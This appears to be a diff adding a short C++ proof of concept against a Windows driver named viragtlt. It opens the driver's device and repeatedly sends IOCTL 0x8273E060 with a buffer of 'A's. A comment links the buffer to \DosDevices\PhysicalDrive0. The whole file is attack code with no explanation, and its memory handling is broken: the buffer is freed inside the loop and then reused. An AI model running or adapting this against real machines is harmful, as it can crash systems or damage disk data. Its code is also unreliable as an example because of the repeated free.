@@ -1,0 +1,33 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <windows.h>
+
+ 
+int main(int argc, char *argv[]) 
+{
+    HANDLE     hDevice;
+    DWORD      dwRetBytes = 0;  
+	char szinput[0x1] = {0};
+	memset(szinput, 0x41, 1);
+ 
+    hDevice = CreateFile("\\\\.\\viragtlt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+
+	char*szBuf = new char[100];
+	memset(szBuf, 0x41, 100);
+	wcscpy((wchar_t*)szBuf, L"\\DosDevices\\viragtlt");//viragt: \DosDevices\PhysicalDrive0 
+	for (int j = 0; j < 10; j++)
+	{
+		for (DWORD i = 20; i < 0xffff; i++)
+		{
+
+			
+			
+			DeviceIoControl(hDevice,  0x8273E060, (LPVOID)szBuf, 100, (LPVOID)szBuf, 4, &dwRetBytes, NULL); 
+			delete[] szBuf;
+		}
+	}
+	
+
+    CloseHandle(hDevice); 
+    return 0;
+}
